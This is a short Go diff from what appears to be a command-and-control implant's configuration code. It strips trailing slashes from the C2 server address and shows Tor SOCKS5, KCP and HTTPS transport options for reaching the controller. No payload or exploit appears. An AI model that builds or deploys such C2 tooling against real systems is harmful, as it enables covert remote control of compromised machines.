@@ -72,19 +72,17 @@ func InitConfig() (err error) {
 			def.CCAddress = fmt.Sprintf("http://%s", def.CCAddress)
 		}
 		// if port is missing, add 80? No, Tor handles it.
-		// just ensure trailing slash
-		if !strings.HasSuffix(def.CCAddress, "/") {
-			def.CCAddress = fmt.Sprintf("%s/", def.CCAddress)
-		}
+		// ensure no trailing slash
+		def.CCAddress = strings.TrimSuffix(def.CCAddress, "/")
 
 		if RuntimeConfig.C2TransportProxy == "" {
 			RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
 		}
 	} else if RuntimeConfig.UseKCP {
 		RuntimeConfig.CCPort = RuntimeConfig.KCPClientPort
-		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s/", RuntimeConfig.CCPort)
+		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCPort)
 	} else {
-		def.CCAddress = fmt.Sprintf("https://%s:%s/", def.CCAddress, RuntimeConfig.CCPort)
+		def.CCAddress = fmt.Sprintf("https://%s:%s", def.CCAddress, RuntimeConfig.CCPort)
 	}
 
 	// CA
